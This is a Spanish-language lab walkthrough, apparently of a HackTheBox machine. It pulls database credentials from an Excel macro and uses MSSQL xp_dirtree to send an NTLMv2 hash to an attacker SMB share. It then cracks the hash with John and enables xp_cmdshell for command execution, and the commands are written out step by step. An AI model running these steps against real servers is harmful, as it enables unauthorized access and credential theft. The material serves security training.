## Vulnerability Assessment {-}

### Analyzamos el fichero xlsm {-}

```type
type "Currency Volume Report.xlsm"
#Output
Microsoft Excel 2007+

strings Currency\ Volume\ Report.xlsm
```

#### Analysis de ficheros Microsoft office con olevba {-}

**olevba** es un script escrito en python que permitte parsear OLE y OpenXML como documentos MS Office (word, excel, ...)
para extraer codig VBA Macros en texto claro, deobfuscate y analyzo de macros maliciosas 

Installacion

```bash
git clone https://github.com/decalage2/oletools
cd oletools
python3 setup.py install
```

Utilisacion

```bash
olevba Currency\ Volume\ Report.xlsm
```

Aqui olevba nos muestra una macro `ThisWorkbook.cls` y credenciales de base de datos en texto claro.

Antes de intentar connectarnos al servicio MSSQL, validamos las credenciales con crackmapexec.

### Validacion de credenciales con CrackMapExec {-}

```bash
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc$c6'
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc$c6' -d WORKGROUP
```

CrackMapExec nos muestra un **[-]** que quiere decir que el usuario no es valido a nivel de dominio HTB.LOCAL. Pero
nos muestra un **[+]** con el dominio WORKGROUP. Esto quiere decir quel usuario reporting existe a nivel local.

Aqui ya savemos que la credencial es valida

### Conneccion con evil-winrm usuario reporting {-}

Como tenemos credenciales y que savemos que son validas, intentamos connectarnos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc'
```

Aqui no funcciona.

### Conneccion al servicio MSSQL usuario reporting {-}

```bash
/usr/local/bin/mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
password: PcwTW1HRwryjc$c6

SQL> 
```

Con MSSQL hay un commando que se llama `xp_cmdshell` que nos permitte enviar commandos a nivel de systema

```bash
xp_cmdshell "whoami"
#Output
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied
```

Aqui el truquillo seria de configurar la possibilidad al usuario de ejecutar commandos avanzados

```bash
sp_configure "show advanced", 1
#Output
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action
```

Como aqui vemos que el usuario reporting no tiene derechos de lanzar commandos o modificar las configuraciones, lo que vamos a intentar
es entablar una conneccion a nivel de red que el proprio usuario reporting no puede hacer porque es usuario local. Hay un commando de
MSSQL llamado `xp_dirtree` que permitte buscar ficheros en recursos compartidos

1. En la maquina de attackante, creamos un recurso compartido con smb

    ```bash
    impacket-smbserver smbFolder $(pwd) --smb2support
    ```

1. En el mssql lanzamos el commando

    ```bash
    xp_dirtree "\\10.10.14.8\smbFolder\test"
    ```

Ya podemos ver que la conneccion a funccionado y que podemos ver un hash NTLMv2 del usuario **mssql-svc**.
Aqui copiamos el hash en un fichero y lo crackeamos con John. A vezes el hash puede que no sea del todo correcto, y si es
el caso, podemos intentar hacer la misma maniobra con la herramienta **responder** en vez de la **impacket-smbserver**

1. En la maquina de attackante, creamos un recurso compartido con smb

    ```bash
    python3 /usr/share/responder/Responder.py -I tun0 -rdw
    ```

1. En el mssql lanzamos el commando

    ```bash
    xp_dirtree "\\10.10.14.8\EEEE"
    ```

Aqui podemos ver que tambien se puede interceptar el hash NTLMv2.

### Crackeo de hash NTLMv2 con John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya hemos podido crackear el hash NTLMv2 del usuario **mssql-svc**. Y como siempre cuando el servicio **SMB** esta abierto, 
nueva credencial obtenida, nueva credencial que validamos con CrackMapExec.

### Validacion de las creds de mssql-svc {-}

```bash
crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
```

CrackMapExec nos reporta un **[+]** quiere decir que las credenciales son validas. Nuevamente intentamos connectarnos por
WinRM

### Conneccion con evil-winrm usuario mssql-svc {-}

Como tenemos credenciales y que savemos que son validas, intentamos connectarnos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.125 -u 'mssql-svc' -p 'corporate568'
```

Aqui tampoco nos funcciona.

### Conneccion al servicio MSSQL usuario mssql-svc {-}

```bash
/usr/local/bin/mssqlclient.py WORKGROUP/mssql-svc:corporate568@10.10.10.125 -windows-auth

SQL> 
```

Intentamos el commando `xp_cmdshell`

```bash
xp_cmdshell "whoami"
#Output
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component
    'xp_cmdshell' because this component is turned off ...
```

Aqui el error es distincto al del otro usuario. Intentamos nuevamente modificar las configuraciones.

```bash
sp_configure "xp_cmdshell", 1
#Output
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
```

El mensaje de error aqui es claro, y si es una option avanzada tenemos que modificar la config de esta option.

```bash
sp_configure "show advanced", 1
reconfigure
sp_configure "xp_cmdshell", 1
reconfigure
xp_cmdshell "whoami"
#Output

querier\mssql-svc
```

Ahora si. Ya podemos lanzar commandos a nivel de systema. La idea ahora seria meternos en el systema con una reverse shell.
